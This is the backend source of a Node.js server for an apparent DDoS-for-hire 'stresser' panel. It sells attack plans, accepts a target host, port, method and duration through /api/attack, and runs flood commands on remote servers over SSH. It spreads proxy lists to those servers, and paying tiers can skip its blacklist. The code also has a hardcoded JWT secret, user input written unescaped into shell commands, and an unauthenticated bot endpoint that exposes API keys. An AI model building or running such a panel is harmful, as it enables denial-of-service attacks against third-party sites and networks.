const express = require('express');
const fileUpload = require('express-fileupload');
const fs = require('fs');
const bodyParser = require('body-parser');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const jwt = require('jsonwebtoken');
const { DataManager, AuthManager, SSHManager, AttackManager, WebhookManager } = require('./managers');
AuthManager.migrateKeys();

const JWT_SECRET = 'cyber_secret_key_2026';

const rateLimit = require('express-rate-limit');

const app = express();
app.disable('x-powered-by');
const port = 8880;

const limiter = rateLimit({
    windowMs: 1 * 60 * 1000, // 1 minute
    max: 100, // Reduced from 500 to 100 requests per minute
    message: { error: true, message: "Too many requests, please try again later." },
    standardHeaders: true, // Return rate limit info in the `RateLimit-*` headers
    legacyHeaders: false, // Disable the `X-RateLimit-*` headers
});

// Specific limiters for sensitive endpoints
const authLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 10, // Limit each IP to 10 login/register requests per 15 minutes
    message: { error: true, message: "Too many authentication attempts, please try again later." },
    standardHeaders: true,
    legacyHeaders: false,
});

const apiLimiter = rateLimit({
    windowMs: 1 * 60 * 1000, // 1 minute
    max: 30, // Limit API calls to 30 per minute per IP
    message: { error: true, message: "Too many API requests, please try again later." },
    standardHeaders: true,
    legacyHeaders: false,
});

app.use(bodyParser.json());
app.use(fileUpload());
app.use(express.static(path.join(__dirname, 'public')));

// --- SECURITY & STABILITY HEADERS ---
app.use((req, res, next) => {
    res.setHeader("Content-Security-Policy", "default-src 'self' https: 'unsafe-inline' 'unsafe-eval'; img-src 'self' data: https:; script-src 'self' https://cdn.jsdelivr.net https://static.cloudflareinsights.com 'unsafe-inline' 'unsafe-eval'; style-src 'self' https://fonts.googleapis.com 'unsafe-inline'; font-src 'self' https://fonts.gstatic.com; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; upgrade-insecure-requests");
    res.setHeader("X-Content-Type-Options", "nosniff");
    res.setHeader("X-Frame-Options", "DENY");
    res.setHeader("X-XSS-Protection", "1; mode=block");
    res.setHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains");
    res.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");
    res.setHeader("Permissions-Policy", "geolocation=(), microphone=(), camera=(), payment=()");
    next();
});

// Helper for standardized JSON responses
const sendResponse = (res, status, data) => {
    res.status(status).json({
        success: status < 400,
        ...data,
        timestamp: new Date().toISOString()
    });
};

// Apply general rate limiting to all API routes
app.use('/api/', limiter);

// Middleware for JWT & API Key Authentication
const authenticateToken = (req, res, next) => {
    // 1. Check for API Key in Query (?key=...)
    const apiKey = (req.query.key || '').trim();
    if (apiKey) {
        const users = DataManager.read('users.json');
        const user = users.find(u => u.apiKey === apiKey);
        if (user) {
            req.user = user;
            return next();
        } else {
            return sendResponse(res, 401, { message: `Invalid API Key: ${apiKey.substring(0, 10)}...` });
        }
    }

    // 2. Existing JWT Logic
    const authHeader = req.headers['authorization'];
    const token = (authHeader && authHeader.startsWith('Bearer ')) ? authHeader.split(' ')[1] : null;

    if (!token) return sendResponse(res, 401, { message: "Unauthorized" });

    jwt.verify(token, JWT_SECRET, (err, user) => {
        if (err) return sendResponse(res, 403, { message: "Session expired" });
        const dbUser = AuthManager.getUser(user.username);
        if (!dbUser) return sendResponse(res, 403, { message: "User not found" });
        req.user = dbUser;
        next();
    });
};

// Apply stricter limits to authentication routes
app.post('/api/register', authLimiter, (req, res) => {
    const { username, password, telegramId } = req.body;
    if (!username || !password) return sendResponse(res, 400, { message: "Username and password required!" });
    const result = AuthManager.register(username, password, telegramId);
    if (!result.error) {
        const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: '24h' });
        sendResponse(res, 201, { ...result, token, plan: 'Free' });
    } else {
        sendResponse(res, 400, result);
    }
});

app.post('/api/login', authLimiter, (req, res) => {
    const { username, password } = req.body;
    const result = AuthManager.login(username, password);
    if (!result.error) {
        const token = jwt.sign({ username: result.user.username }, JWT_SECRET, { expiresIn: '24h' });
        sendResponse(res, 200, { token, isAdmin: result.user.plan === 'Admin', plan: result.user.plan });
    } else {
        sendResponse(res, 401, { message: result.message });
    }
});

// Apply API-specific limiting to attack endpoints
app.get('/api/attack', apiLimiter, authenticateToken, async (req, res) => {
    const { host, port, method, time, conc } = req.query;
    const user = req.user;

    const plans = DataManager.read('plans.json');
    const userPlan = plans[user.plan] || plans['Free'];

    if (userPlan.slots === 0 || userPlan.concurrents === 0) {
        return res.json({ success: false, message: "Your plan does not allow attacks. Please upgrade!" });
    }

    const maxTime = userPlan.maxTime;
    const maxSlots = user.slots !== undefined && user.slots !== null ? parseInt(user.slots) : userPlan.slots;
    const vpsLimit = user.concurrents !== undefined && user.concurrents !== null ? parseInt(user.concurrents) : (userPlan.concurrents || 1);
    let requestedConc = vpsLimit;

    if (conc) {
        const parsedConc = parseInt(conc);
        if (isNaN(parsedConc) || parsedConc < 1) {
            return res.json({ success: false, message: "Invalid node count!" });
        }
        requestedConc = Math.min(parsedConc, vpsLimit);
    }

    if (!host || !port || !method || !time) {
        return res.json({ success: false, message: "Missing parameters!" });
    }

    const timeInt = parseInt(time);
    const portInt = parseInt(port);

    if (isNaN(timeInt) || timeInt < 10) {
        return res.json({ success: false, message: "Minimum attack time is 10s!" });
    }

    if (timeInt > maxTime) {
        return res.json({ success: false, message: `Time limit exceeded! Max: ${maxTime}s` });
    }

    if (isNaN(portInt) || portInt < 1 || portInt > 65535) {
        return res.json({ success: false, message: "Invalid port range! Must be 1-65535." });
    }

    const methods = DataManager.read('methods.json') || {};
    let methodConf = null;
    let methodType = null;
    for (const group in methods) {
        if (methods[group] && methods[group][method]) {
            methodConf = methods[group][method];
            methodType = methodConf.Type || (group === 'layer7' ? 'layer7' : 'layer4');
            break;
        }
    }

    if (!methodConf) {
        return res.json({ success: false, message: "Invalid attack method!" });
    }

    const hostRegex = /^[a-zA-Z0-9.-]+$/;
    const urlRegex = /^https?:\/\/[^\s/$.?#].[^\s]*$/i;

    if (methodType === 'layer7') {
        if (!urlRegex.test(host)) {
            return res.json({ success: false, message: "Layer 7 requires a valid URL (http:// or https://)!" });
        }
    } else {
        if (host.includes('://')) {
            return res.json({ success: false, message: "Layer 4 target must be an IP or Hostname (do not include http/https)!" });
        }
        if (!hostRegex.test(host)) {
            return res.json({ success: false, message: "Invalid hostname or IP format!" });
        }
    }

    // Blacklist validation
    if (!userPlan.bypassBlacklist) {
        let blacklist = [];
        try {
            const blData = require('fs').readFileSync(require('path').join(__dirname, 'database', 'blacklist.txt'), 'utf8');
            blacklist = blData.split('\n').map(l => l.trim()).filter(l => l);
        } catch (e) {
            console.warn("Could not load blacklist.txt. Continuing without blacklist protection.");
        }

        let targetHost = host;
        try { if (host.startsWith('http')) targetHost = new URL(host).hostname; } catch (e) { }

        for (const blocked of blacklist) {
            if (targetHost.toLowerCase().endsWith(blocked.toLowerCase())) {
                return res.json({ success: false, message: `Access Denied: The target domain (${blocked}) is protected by Blacklist policies.` });
            }
        }
    }

    const currentSessions = state.Attacks.filter(a => a.user === user.username).length;
    if (currentSessions >= maxSlots) {
        return res.json({ success: false, message: `No slots available! Max: ${maxSlots}` });
    }

    // Duplicate Target Protection
    const isTargetDuplicated = state.Attacks.some(a => {
        // Clean both targets to hostname structure (ignore protocol/slash if mixed formats exist)
        let activeHost = a.host;
        let incomingHost = host;
        try { if (activeHost.startsWith('http')) activeHost = new URL(activeHost).hostname; } catch (e) { }
        try { if (incomingHost.startsWith('http')) incomingHost = new URL(incomingHost).hostname; } catch (e) { }
        return activeHost.toLowerCase() === incomingHost.toLowerCase();
    });

    if (isTargetDuplicated) {
        return res.json({ success: false, message: "Access Denied: The target domain is already under active attack." });
    }

    const attackId = uuidv4();
    // (methods and methodConf are already loaded during validation)

    // Dynamic Command Template Resolution
    let cmdTemplate = methodConf?.Command || `screen -dmS {attackId} ./{method} {host} {port} {time} {conc} 16`;
    const finalCommand = cmdTemplate
        .replace(/{attackId}/g, attackId)
        .replace(/{host}/g, host)
        .replace(/{port}/g, port)
        .replace(/{time}/g, time)
        .replace(/{conc}/g, requestedConc)
        .replace(/{method}/g, method.toLowerCase());

    const attackData = {
        id: attackId,
        user: user.username,
        host,
        port,
        method,
        time: parseInt(time),
        timestamp: new Date().toISOString(),
        status: 'running',
        command: finalCommand
    };

    try {
        const usedServers = await AttackManager.startAttack(user, attackData, method, requestedConc);
        attackData.servers = usedServers.map(s => s.id);
        attackData.serverNames = usedServers.map(s => s.name).join(', ');

        state.Attacks.push({ ...attackData, timeLeft: parseInt(time) });
        state.Ongoing++;

        const logs = DataManager.read('logs.json') || [];
        logs.push(attackData);
        DataManager.write('logs.json', logs);

        WebhookManager.notify({
            title: "ATTACK INITIATED",
            description: "A new high-intensity stress test has been launched from the command center.",
            color: 0x00ff9d, // Green
            fields: [
                { name: "Target", value: `\`${host}:${port}\``, inline: true },
                { name: "Method", value: `\`${method}\``, inline: true },
                { name: "Time", value: `\`${time}s\``, inline: true },
                { name: "User", value: `\`${user.username}\``, inline: true }
            ]
        });

        res.json({ success: true, message: "Attack launched!", id: attackId, results: usedServers });
    } catch (e) {
        res.json({ success: false, message: e.message });
    }
});

// --- GLOBAL STABILITY GUARDS ---
process.on('uncaughtException', (err) => {
    console.error('CRITICAL UNCAUGHT EXCEPTION:', err);
    fs.appendFileSync(path.join(__dirname, 'logs', 'error.log'), `[${new Date().toISOString()}] UNCAUGHT EXCEPTION: ${err.stack}\n`);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('UNHANDLED REJECTION:', reason);
    fs.appendFileSync(path.join(__dirname, 'logs', 'error.log'), `[${new Date().toISOString()}] UNHANDLED REJECTION: ${reason}\n`);
});

let state = {
    Ongoing: 0,
    Attacks: []
};
global.appState = state;


// Initialize state from existing logs
try {
    const logs = DataManager.read('logs.json') || [];
    const now = Date.now();
    logs.forEach(l => {
        if (l.status === 'running') {
            const startTime = new Date(l.timestamp).getTime();
            const elapsed = Math.floor((now - startTime) / 1000);
            const timeLeft = l.time - elapsed;

            if (timeLeft > 0) {
                state.Attacks.push({ ...l, timeLeft });
                state.Ongoing++;
            } else {
                l.status = 'expired';
            }
        }
    });
    DataManager.write('logs.json', logs);

    // Recalibrate server slots based on recovered attacks
    const servers = DataManager.read('servers.json');
    if (servers) {
        servers.forEach(s => s.ongoing = 0);
        state.Attacks.forEach(a => {
            if (a.servers) {
                a.servers.forEach(sid => {
                    const sIdx = servers.findIndex(s => s.id === sid);
                    if (sIdx !== -1) servers[sIdx].ongoing++;
                });
            }
        });
        DataManager.write('servers.json', servers);
    }
} catch (e) {
    console.error("Failed to initialize state:", e);
}

// Background slot reconciliation loop
setInterval(() => {
    try {
        const servers = DataManager.read('servers.json');
        if (!servers) return;
        const counts = {};
        state.Attacks.forEach(a => {
            if (a.servers) {
                a.servers.forEach(sid => {
                    counts[sid] = (counts[sid] || 0) + 1;
                });
            }
        });
        let changed = false;
        servers.forEach(s => {
            const actual = counts[s.id] || 0;
            if (s.ongoing !== actual) {
                s.ongoing = actual;
                changed = true;
            }
        });
        if (changed) DataManager.write('servers.json', servers);
    } catch (e) { }
}, 30000);


const adminAuth = (req, res, next) => {
    authenticateToken(req, res, () => {
        if (req.user && req.user.plan === 'Admin') {
            next();
        } else {
            res.status(403).json({ error: true, message: "Admin access required" });
        }
    });
};

// --- Routes ---

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.get('/register', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'register.html'));
});

app.get('/profile', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'profile.html'));
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});


app.get('/download', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'download.html'));
});

app.get('/api-center', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'api-center.html'));
});

app.get('/methods', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'methods.html'));
});

app.get('/api/public/plans', (req, res) => {
    const plans = DataManager.read('plans.json');
    res.json(plans);
});

app.get('/api/public/settings', (req, res) => {
    const settings = DataManager.read('settings.json');
    res.json(settings);
});



app.post('/api/user/profile/update', authenticateToken, (req, res) => {
    const { currentPassword, newPassword, telegramId } = req.body;
    const username = req.user.username;

    const result = AuthManager.updateProfile(username, { currentPassword, newPassword, telegramId });
    res.json(result);
});



app.get('/api/attacks/active', authenticateToken, (req, res) => {
    const userAttacks = state.Attacks.filter(a => a.user === req.user.username);
    res.json(userAttacks);
});

app.post('/api/user/regen-key', authenticateToken, (req, res) => {
    const result = AuthManager.regenApiKey(req.user.username);
    res.json(result);
});

app.get('/api/user/info', authenticateToken, (req, res) => {
    const plans = DataManager.read('plans.json');
    const userPlan = plans[req.user.plan] || plans['Free'];
    const currentSessions = state.Attacks.filter(a => a.user === req.user.username).length;

    res.json({
        username: req.user.username,
        plan: req.user.plan,
        slots: req.user.slots !== undefined && req.user.slots !== null ? parseInt(req.user.slots) : userPlan.slots,
        slotsUsed: currentSessions,
        maxTime: userPlan.maxTime,
        concurrents: req.user.concurrents !== undefined && req.user.concurrents !== null ? parseInt(req.user.concurrents) : userPlan.concurrents,
        expiration: req.user.expiration,
        apiKey: req.user.apiKey,
        telegramId: req.user.telegramId || ""
    });
});

app.post('/api/user/link-telegram', authenticateToken, (req, res) => {
    const { telegramId } = req.body;
    if (!telegramId) return res.json({ success: false, message: "Missing Telegram ID" });

    const users = DataManager.read('users.json');
    const idx = users.findIndex(u => u.username === req.user.username);
    if (idx !== -1) {
        users[idx].telegramId = telegramId.toString();
        DataManager.write('users.json', users);
        return res.json({ success: true, message: "Telegram ID linked successfully!" });
    }
    res.json({ success: false, message: "User not found" });
});

// Bot-specific internal endpoint
app.get('/api/bot/user/:telegramId', (req, res) => {
    const { telegramId } = req.params;
    const user = AuthManager.getUserByTelegramId(telegramId);
    if (!user) return res.json({ success: false, message: "User not found" });

    const plans = DataManager.read('plans.json');
    const userPlan = plans[user.plan] || plans['Free'];
    const currentSessions = (global.appState?.Attacks || []).filter(a => a.user === user.username).length;

    res.json({
        success: true,
        user: {
            username: user.username,
            plan: user.plan,
            slots: userPlan.slots,
            slotsUsed: currentSessions,
            maxTime: userPlan.maxTime,
            concurrents: userPlan.concurrents,
            expiration: user.expiration,
            apiKey: user.apiKey
        }
    });
});

app.get('/api/methods', (req, res) => {
    res.json(DataManager.read('methods.json'));
});

// Admin Routes
app.get('/api/admin/users', adminAuth, (req, res) => {
    const users = DataManager.read('users.json');
    const plans = DataManager.read('plans.json') || {};
    const usersWithStats = users.map(u => {
        const currentSessions = state.Attacks.filter(a => a.user === u.username).length;
        const userPlan = plans[u.plan] || plans['Free'] || {};
        return {
            ...u,
            slotsUsed: currentSessions,
            slots: u.slots !== undefined && u.slots !== null ? u.slots : (userPlan.slots || 0),
            concurrents: u.concurrents !== undefined && u.concurrents !== null ? u.concurrents : (userPlan.concurrents || 0)
        };
    });
    res.json(usersWithStats);
});

app.post('/api/admin/users/add', adminAuth, (req, res) => {
    const { username, password, plan, slots, concurrents, expiration } = req.body;
    const users = DataManager.read('users.json');
    const existing = users.findIndex(u => u.username === username);

    const s = slots ? parseInt(slots) : undefined;
    const c = concurrents ? parseInt(concurrents) : undefined;

    if (existing !== -1) {
        users[existing].plan = plan;
        if (s !== undefined) users[existing].slots = s;
        if (c !== undefined) users[existing].concurrents = c;
        users[existing].expiration = expiration;
        if (password) users[existing].password = AuthManager.hashPassword(password);
    } else {
        const p = password ? AuthManager.hashPassword(password) : "";
        users.push({ username, password: p, plan, slots: s, concurrents: c, expiration });
    }
    DataManager.write('users.json', users);
    res.json({ success: true });
});

app.post('/api/admin/users/update', adminAuth, (req, res) => {
    const { username, updates } = req.body;
    if (!username || !updates) return res.json({ success: false, message: "Missing data" });

    const users = DataManager.read('users.json');
    const idx = users.findIndex(u => u.username === username);
    if (idx === -1) return res.json({ success: false, message: "User not found" });

    if (updates.plan) users[idx].plan = updates.plan;
    if (updates.slots !== undefined) users[idx].slots = parseInt(updates.slots);
    if (updates.concurrents !== undefined) users[idx].concurrents = parseInt(updates.concurrents);
    if (updates.expiration) users[idx].expiration = updates.expiration;
    if (updates.password) users[idx].password = AuthManager.hashPassword(updates.password);

    DataManager.write('users.json', users);
    res.json({ success: true });
});

app.post('/api/admin/users/delete', adminAuth, (req, res) => {
    const { username } = req.body;
    let users = DataManager.read('users.json');
    users = users.filter(u => u.username !== username);
    DataManager.write('users.json', users);
    res.json({ success: true });
});

app.get('/api/admin/servers', adminAuth, (req, res) => {
    const servers = DataManager.read('servers.json');
    const enriched = servers.map(s => {
        const cache = AttackManager.resourceCache[s.id] || { cpu: 0, ram: 0 };
        return { ...s, ...cache };
    });
    res.json(enriched);
});

app.get('/api/admin/servers/check', adminAuth, async (req, res) => {
    const servers = DataManager.read('servers.json');
    const results = await Promise.all(servers.map(async s => {
        try {
            const stats = await SSHManager.checkResources(s);
            return { name: s.name, status: 'online', cpu: stats.cpu.toFixed(1) + '%', ram: stats.ram.toFixed(1) + '%', lat: '...' };
        } catch (e) {
            return { name: s.name, status: 'offline', error: e.message };
        }
    }));
    res.json(results);
});

app.post('/api/admin/servers/toggle', adminAuth, (req, res) => {
    const { id } = req.body;
    const servers = DataManager.read('servers.json');
    const idx = servers.findIndex(s => s.id === id);
    if (idx !== -1) {
        servers[idx].status = servers[idx].status === 'online' ? 'offline' : 'online';
        const newStatus = servers[idx].status;
        DataManager.write('servers.json', servers);

        WebhookManager.notify({
            title: "SERVER STATUS CHANGE",
            description: "Administrative update to network infrastructure.",
            color: newStatus === 'online' ? 0x00ff9d : 0xff5f56,
            fields: [
                { name: "Server", value: `\`${servers[idx].name}\`` },
                { name: "New Status", value: `\`${newStatus.toUpperCase()}\`` },
                { name: "Admin", value: `\`${req.user.username}\`` }
            ]
        });

        res.json({ success: true });
    } else {
        res.json({ success: false });
    }
});

app.post('/api/admin/methods/toggle', adminAuth, (req, res) => {
    const { name } = req.body;
    const methods = DataManager.read('methods.json');
    for (let group in methods) {
        if (methods[group][name]) {
            methods[group][name].status = methods[group][name].status === 'online' ? 'offline' : 'online';
            const newStatus = methods[group][name].status;
            DataManager.write('methods.json', methods);

            WebhookManager.notify({
                title: "METHOD STATUS UPDATE",
                description: "Global attack vector availability has changed.",
                color: newStatus === 'online' ? 0x9d00ff : 0xffa500,
                fields: [
                    { name: "Method", value: `\`${name}\`` },
                    { name: "Status", value: `\`${newStatus.toUpperCase()}\`` },
                    { name: "Admin", value: `\`${req.user.username}\`` }
                ]
            });

            return res.json({ success: true });
        }
    }
    res.json({ success: false });
});

app.get('/api/admin/logs', adminAuth, (req, res) => {
    res.json(DataManager.read('logs.json'));
});

app.post('/api/admin/logs/clear', adminAuth, (req, res) => {
    DataManager.write('logs.json', []);
    res.json({ success: true, message: "Attack logs cleared successfully." });
});

app.get('/api/admin/activity-logs', adminAuth, (req, res) => {
    res.json(DataManager.read('activity_logs.json'));
});

app.post('/api/admin/activity-logs/clear', adminAuth, (req, res) => {
    DataManager.write('activity_logs.json', []);
    res.json({ success: true, message: "Activity logs cleared successfully." });
});

app.post('/api/admin/proxy/upload', adminAuth, async (req, res) => {
    if (!req.files || Object.keys(req.files).length === 0) {
        return res.status(400).json({ error: true, message: 'No files were uploaded.' });
    }

    const proxyFile = req.files.proxyFile;
    const uploadPath = path.join(__dirname, 'proxy.txt');

    try {
        await proxyFile.mv(uploadPath);

        const servers = DataManager.read('servers.json') || [];
        const onlineServers = servers.filter(s => s.status === 'online');
        const results = [];

        // Distribute to all online servers
        const distributions = onlineServers.map((server) => {
            return (async () => {
                try {
                    const remotePath = '/root/proxy.txt';
                    await SSHManager.uploadFile(server, uploadPath, remotePath);
                    results.push({ server: server.name, status: 'success' });
                } catch (err) {
                    console.error(`Failed to upload to ${server.name}:`, err.message);
                    results.push({ server: server.name, status: 'failed', error: err.message });
                }
            })();
        });

        await Promise.all(distributions);

        res.json({
            success: true,
            message: `Proxy updated and distributed to ${results.filter(r => r.status === 'success').length}/${onlineServers.length} servers.`,
            results
        });
    } catch (err) {
        console.error('Proxy distribution error:', err);
        res.status(500).json({ error: true, message: err.message });
    }
});

// Background loop for attack tracking
setInterval(() => {
    const expiredAttacks = state.Attacks.filter(a => a.timeLeft <= 0);
    if (expiredAttacks.length > 0) {
        state.Attacks = state.Attacks.filter(a => a.timeLeft > 0);

        const logs = DataManager.read('logs.json') || [];

        expiredAttacks.forEach(a => {
            AttackManager.stopAttack(a.id, a.servers);
            state.Ongoing--;

            const lIdx = logs.findIndex(l => l.id === a.id);
            if (lIdx !== -1) logs[lIdx].status = 'expired';
        });

        DataManager.write('logs.json', logs);
    }

    state.Attacks.forEach(a => {
        a.timeLeft--;
    });
}, 1000);

// 404 Handler - Catch-all for non-matching routes
app.use((req, res) => {
    if (req.accepts('html')) {
        return res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
    }
    sendResponse(res, 404, { message: "Endpoint not found" });
});

app.listen(port, () => {
    console.log(`@ZzTLINHzZ API listening on port ${port}`);
});

// Start integrated Telegram bot (optional)
try {
    const Bot = require('./bot');
    Bot.start().catch(e => console.error('[Bot] start failed:', e.message));
} catch (e) {
    console.error('[API] Bot module not loaded:', e.message);
}
